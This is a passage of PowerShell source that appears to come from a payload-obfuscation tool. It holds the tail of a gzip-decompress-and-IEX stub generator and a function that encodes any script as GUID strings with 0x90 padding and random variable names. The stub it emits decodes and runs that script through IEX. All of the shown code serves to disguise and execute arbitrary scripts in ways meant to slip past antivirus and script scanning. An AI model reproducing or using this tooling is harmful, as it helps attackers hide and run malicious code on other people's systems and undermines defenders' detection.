`$$GzipStreamVar.CopyTo(`$$DecompressedStreamVar)
`$$GzipStreamVar.Dispose(); `$$MemoryStreamVar.Dispose()
`$$DecompressedStreamVar.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
`$$StreamReaderVar = New-Object System.IO.StreamReader(`$$DecompressedStreamVar)
`$$DecompressedStringVar = `$$StreamReaderVar.ReadToEnd()
`$$DecompressedStringVar | IEX
"@

    Return ($DecompressionCommand)
}

function Out-UUID {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$InputString
    )

    $byteArray = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    Process-Binary $byteArray
}

function Process-Binary {
    param (
        [byte[]]$byteArray
    )

    $totalChunks = [math]::Ceiling($byteArray.Length / 16)
    $guidList = New-Object 'System.Collections.Generic.List[string]' ($totalChunks)

    for ($i = 0; $i -lt $byteArray.Length; $i += 16) {
        $remainingBytes = $byteArray.Length - $i

        if ($remainingBytes -ge 16) {
            $chunk = $byteArray[$i..($i + 15)]
        }
        else {
            $padLength = 16 - $remainingBytes
            $padding = @(0x90) * $padLength
            $chunk = $byteArray[$i..($byteArray.Length - 1)] + $padding
        }

        $data1 = [BitConverter]::ToInt32($chunk, 0)
        $data2 = [BitConverter]::ToInt16($chunk, 4)
        $data3 = [BitConverter]::ToInt16($chunk, 6)
        $data4 = $chunk[8..15]

        $guid = New-Object System.Guid($data1, $data2, $data3, $data4)
        $guidList.Add('"' + $guid.ToString() + '"')
    }

    Function Get-RandomVariableName {
        $Length = Get-Random -Minimum 8 -Maximum 12
        -join ((65..90) + (97..122) | Get-Random -Count $Length | ForEach-Object { [char]$_ })
    }

    $Bytes = Get-RandomVariableName
    $String = Get-RandomVariableName
    $Array = Get-RandomVariableName

    $guidArrayString = $guidList -join ",`n    "

    $UUIDScript = @"
[Array] `$$Array = @(
    $guidArrayString
)

`$b = New-Object byte[] (`$$Array.Length * 16)
for (`$index = 0; `$index -lt `$$Array.Length; `$index++) { [Buffer]::BlockCopy(([Guid]::Parse(`$$Array[`$index`])).ToByteArray(), 0, `$b, `$index * 16, 16) }
`$$Bytes = `$b | Where-Object { `$_ -ne 0x90 -and `$_ -ne 0 }
`$$String = [System.Text.Encoding]::UTF8.GetString(`$$Bytes)
`$$String | IEX
"@

    return $UUIDScript
}
